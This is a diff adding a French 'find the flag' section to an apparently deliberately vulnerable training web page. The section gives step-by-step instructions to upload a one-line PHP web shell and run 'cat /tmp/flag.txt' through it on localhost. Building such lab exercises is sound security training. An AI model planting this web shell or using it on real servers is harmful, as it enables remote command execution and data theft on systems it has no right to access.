@@ -119,6 +119,37 @@
                 </div>
             </details>
         </section>
+        <!-- Section Flag -->
+        <section class="info-section" style="margin-top: 20px; border-left: 4px solid #FFD700;">
+            <details>
+                <summary>🏆 VALIDATION - Flag à trouver</summary>
+                <div class="info-content">
+                    <p><strong>Objectif :</strong> Lire le fichier <code>/tmp/flag.txt</code> sur le serveur.</p>
+                    
+                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0;">
+                        <p style="color: #FFD700; font-weight: bold;">🎯 Méthode :</p>
+                        <ol style="color: var(--text-secondary);">
+                            <li>Uploader <code>shell.php</code> avec le contenu :</li>
+                            <pre style="background: #000; color: #0f0;">&lt;?php system($_GET['cmd']); ?&gt;</pre>
+                            <li>Exécuter la commande :</li>
+                            <pre style="background: #000; color: #0f0;">http://localhost:8080/uploads/shell.php?cmd=cat%20/tmp/flag.txt</pre>
+                        </ol>
+                    </div>
+                    
+                    <div style="background: #0a1a0a; padding: 15px; border-radius: 5px; margin-top: 15px; text-align: center;">
+                        <p style="color: #FFD700; font-weight: bold;">🔑 Le flag à trouver :</p>
+                        <p style="font-size: 1.5rem; font-family: monospace; letter-spacing: 2px; background: #000; padding: 10px; border-radius: 5px; color: #0f0;">
+                            FLAG{????????????????}
+                        </p>
+                        <p style="color: var(--text-secondary); font-size: 0.9rem;">(12 caractères, format FLAG{...})</p>
+                    </div>
+                    
+                    <p style="margin-top: 15px; color: #ff9999;">
+                        ⚠️ À COMMUNIQUER À L'ÉQUIPE WP1/WP2 : Quand tu trouves le flag, envoie-le dans le groupe pour valider que l'attaque fonctionne.
+                    </p>
+                </div>
+            </details>
+        </section>
     </main>
 
     <!-- Footer DIABLE -->
